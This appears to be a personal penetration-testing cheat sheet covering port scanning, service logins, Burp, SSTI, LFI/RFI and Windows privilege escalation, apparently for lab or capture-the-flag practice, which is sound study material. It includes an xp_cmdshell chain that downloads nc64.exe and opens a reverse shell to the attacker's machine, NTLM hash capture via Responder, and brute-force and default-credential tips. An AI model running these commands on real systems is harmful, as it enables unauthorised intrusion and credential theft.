# Basics to Pentesting

---

## NMAP

* **Scan for open ports**
  
  `nmap -sV {IP}` or `namp -p- {IP}`
  
  `-sV` allows to perform version detection
  
  `-sC` allows to run safe script that can help for version detection
  
  We can speedup the scan using `--min-rate {RATE}` or `-T{RATE}`

* **Identify service on port**
  
  `nmap -p23 {IP}`
  
  As we can see `23/tcp telnet open` so we can try to connect to the machine using telnet.

* **Anti-firewall flag** `-Pn`

---

## TELNET

* **Connect using telnet**
  
  `telnet {IP}`
  
  For the login we can try generally used usernames, such as *admin*, *administrator* or *root*.

---

## FTP

* **Login as guest (no psw)**
  
  `ftp {IP}`
  
  Use *anonymous* as username.

* **Using the `get` command we can directly download a file**

---

## SSH

* **Login as user** 
  
  `ssh {USER}@{IP}`

* **List opened ports**
  
  `ss -tl`
  
  See other useful flags such as `-p` and `-n`

### Hydra

Useful tool to use for testing passwords.

* `hydra -L {USERNAME_LIST} -p '{PASSWORD} {IP} {SERVICE}'`

---

## SMB (server message block)

Protocol used by Microsoft Windows systems, allows to share files, printers and serial ports ... (authenticated process communication)

* **List shares on target**
  
  `smbclient -L {IP}`

* **Connect to machine**
  
  `smbclient //{IP}/{DRIVE} -U {USERNAME}`

* **FTP-like commends, such as `put` or `get`**

Try *Administrator* with *empty* or common passwords

---

## REDIS

Is an In-memory Database used as database, cache, and message broker

* **Connect to Redis**
  
  `redis-cli -h {IP}`

* **Get redis `info`**

* **Get list of databases**
  
  `info keyspace`

* **Get value from keys**
  
  List all keys in database: `keys *`
  
  Get content from key: `get {KEY}`

---

## MONGODB

* **Connect to remote DB**
  
  `./mongo mongodb://{IP}:{PORT}`

* **List databases `show dbs`**

* **List collections in db `use {DB}` and `show collections`**

* **Dump content of interesting collections**
  
  `db.{COLLECTION}.find().pretty()`

---

## MYSQL

* **Connect to remote DB**
  
  `mysql -u {USER} -h {IP} -p {PSW}`
  
  For MariaDB we can use *root* for user (does not require a psw)

---

## POSTGRESQL

* **Connect to remote DB**
  
  `psql -U {USER} -h {IP} -p {PORT}`

---

## RDP (remote desktop protocol)

Protocol used from GUI in Windows Systems

* **Connect to remote host**
  
  `xfreerdp /v:{IP} /u:{USERNAME}`
  
  *administrator* can be useful (does not require a psw)

---

## RSYNC

Allows to sync files and directories from and to different hosts

To connect using anonymous authentication we can use *None*

* **List files**
  
  `rsync --list-only None@{IP}::`

* **Get files**
  
  `rsync None@{IP}::{REMOTEPATH} {LOCALPATH}`

# Server side template Injection (SSTI)

Is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

*Template engines* are designed to generate web pages by combining fixed templates with volatile data.

Generally injection attacks can occur when user input is concatenated directly into a template.

[Exploitation techniques](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

**MindFuck solution:** when fighting for a *require is not defined* error try to modify it to `process.mainModule.require` `:rage:`

Remember to use `execSync` instead of `exec` `:rage:`

# Burpsuite

* **Repeater tab**
  
  Simplest tool to modify and forward requests.

* **Decoder tab**
  
  We can decode/encode text, manually or automatically.
  
  Usually when we need to send special characters in our *payload* for an HTTP requests, we can use the URL encoding.

* **Proxy tab**
  
  We can catch requests from and to a website.

* **Intruder tab**
  
  We can modify a previous "call" for a website and modify it.
  
  We can select different types of attacks to perform.

*Burpsuite is really powerful Google it for more info*

# Responder

Is a useful tool that can do many different kinds of attacks. 

* **Setup a {PROTOCOL} server** (see Reponder.py -h)

Using Responder we can catch responses from services directly on our machine

[Responder](https://github.com/lgandx/Responder)

* **Start Responder**
  
  `sudo python3 Responder.py -I {NETINTERFACE}`

* **Send request in URL**
  
  `{WEBSITE}/?{ARG}=//{RESPONDERIP}/somestring`
  
  We will receive an **NTLM response** to our *SMB server*
  
  Usually a *NTLM response* contains the *Challenge / HASH* that allow us to extract the *{user}* password.
  
  We can try to crack the hash using **John the ripper**

# Win PEAS

Is a script that search for all possible paths to escalate privileges on Windows hosts.

1. **Activate Local server**
   
   [LOCAL HOST] `python3 -m http.server {80}` *use port 80*
   
   [PEAS script](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)
   
   [REMOTE SHELL script](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------)
   
   *Remember to check for your LOCAL IP using* `ifconfig`

2. **Remote shell activation**
   
   * **Get the script inside the ACTIVATED xp_cmdshell in MySQL Remote server**
     
     `xp_cmdshell "powershell cd {ALLOWEDPATH}; wget ...{REMOTESHELL script}"`
   
   * **Active local remote shell**
     
     `sudo nc -lvno {LOCALPORT}`
   
   * **Active remote shell**
     
     `xp_cmdshell "powershell cd {PATHTOREMOTEEXE}; ./nc64.exe -e cmd.exe {LOCALIP} {LOCALPORT}"`
   
   * **Use remote shell from tab used by** `nc`

3. **PEAS activation**
   
   * **Get script from remote shell**
     
     `wget {LOCALIP}/winPEASx64.exe -outfile winPEASx64.exe`
     
     *Remember to use powershell*
   
   * **Execute winPEAS**
     
     Read carefully all the sections (the output can be really long!), check for important info such as installed exe, users, ....
     
     **Current Token privileges**, check for possible vulnerabilities for allow *privileges*.
     
     Example, in case of *SeImpersonatePrivilege* we can use [JuicyPotato](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato)
     
     [see more information about [this](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) privilege]

#### Remember to always check:

* [Windows] *PowerShell history* `C:/{AppDataPATH}/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`

* [Linux] *Bash history* `.bash_history`

* **Microsoft SQL Server** `./examples/mssqlclient.py`
  
  [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
  
  Check configurations in `EXEC sp_configure 'show advanced options', 1` in order to use `EXEC sp_configure 'xp_cmdshell', 1`
  
  * **Connect to remote server**
    
    `python3 mssqlclient.py {USERNAME}@{IP} -windows-auth`
  
  * **Check allowed commands**
    
    `sp_configure`
  
  * **Xp_CMDShell**
    
    `xp_cmdshell "{COMMAND}"`

* **psexec**

# Dir Busting

Directory brute-forcing is a technique used to check a lot of paths on a web server

SecLists: [SecLists](https://github.com/danielmiessler/SecLists)

Practicing: [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)

## Gobuster

* `gobuster dir -u {IP} -w {LIST} -x {FILETYTPETARGET}`

Remember to exclude *error codes* using `-b {CODE_1},{CODE_2}` or add *good codes* `-s {CODE_1},{CODE_2}`

# Sub-Domain enumeration

## Gobuster

* `gobuster vhost -u {IP} -w {LIST} `
  
  *(Use can also use ``--append-domain`` )*

---

---

# Name-Based Virtual hosting

Is a method for hosting multiple domain names on a single server.

The web server checks the domain name provided in the *Host* header field of the HTTP request and sends a response.

> A target Website can redirect to a new Website, and this Website can be unreachable

In order to resolve a *Hostname* into an *IP address* we can:

* **Add a new entry in `/etc/hosts`**
  
  `echo "{IP} {WEBSITENAME}" | sudo tee -a /etc/hosts`

**Names from the same IP must be on a single line!**

`{IP} {WEBSITENAME_1} {WEBSITENAME_2} ...`

---

---

# Local Port forwarding

To access a service running on the remote server, we generate traffic *targeted to a port* on our *local machine* and in turn **ssh** tunnels the traffic to the *remote port*.

* `ssh -L {LOCALPORT}:{DEST_SERVER}:{REMOTEPORT} {IP}`
  
  `{IP}` can be also `{USERNAME}@{IP}`

# Local & Remote File inclusion

## Local

Happens when an application uses the path to a file as an input.

If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the `../` string in the inputted file name. *LFI* can lead to code execution as well.

## Remote

Happens when an attacker loads a remote file on the host using *HTTP*, *FTP* ....

For a good *RFI* we can try to inject particular paths in the *URL*, based on the Webserver used. 

For Windows based systems we can try: 

* `../../../../../../../../windows/system32/drivers/etc/hosts`
  
  This type of attack works if the content of the *PHP* functions is not correctly sanitized, see `include()` function.

# Pentest phases:

## 1- Scan for open ports

## 2- Analyze open ports to see which service can be used

## 3- Try to do Dir Busting to find useful files
